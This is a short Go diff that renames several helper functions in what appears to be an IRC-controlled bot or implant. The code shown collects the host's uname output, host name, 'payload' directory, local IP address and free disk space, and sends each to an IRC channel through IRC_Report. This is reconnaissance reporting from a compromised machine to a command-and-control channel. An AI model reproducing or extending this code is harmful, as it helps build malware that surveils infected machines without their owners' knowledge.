@@ -9,13 +9,13 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-func FreeDiskSpace(hw string) uint64 {
+func freeDiskSpace(hw string) uint64 {
 	var stat unix.Statfs_t
 	unix.Statfs(hw, &stat)
 	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024 //B to GB Formula
 }
 
-func GetLocalIP() (string, error) {
+func getLocalIP() (string, error) {
 	conn, err := net.Dial("udp", "8.8.8.8:22")
 	if err != nil {
 		return "", err
@@ -26,7 +26,7 @@ func GetLocalIP() (string, error) {
 	return ip, nil
 }
 
-func SYSinfo() string {
+func sysInfo() string {
 	cmd, _ := exec.Command("uname", "-a").Output()
 	return string(cmd)
 }
@@ -36,10 +36,10 @@ func ReportInf(reportIRC net.Conn, set_chan string) {
 	pDir, _ := os.Getwd()
 
 	hw := &pDir
-	sFds := fmt.Sprint(FreeDiskSpace(*hw))
-	sGlp := fmt.Sprint(GetLocalIP())
+	sFds := fmt.Sprint(freeDiskSpace(*hw))
+	sGlp := fmt.Sprint(getLocalIP())
 
-	IRC_Report(reportIRC, set_chan, "System Info: "+SYSinfo())
+	IRC_Report(reportIRC, set_chan, "System Info: "+sysInfo())
 	IRC_Report(reportIRC, set_chan, "Host Name: "+hName)
 	IRC_Report(reportIRC, set_chan, "Payload DIR: "+pDir)
 	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+sFds)
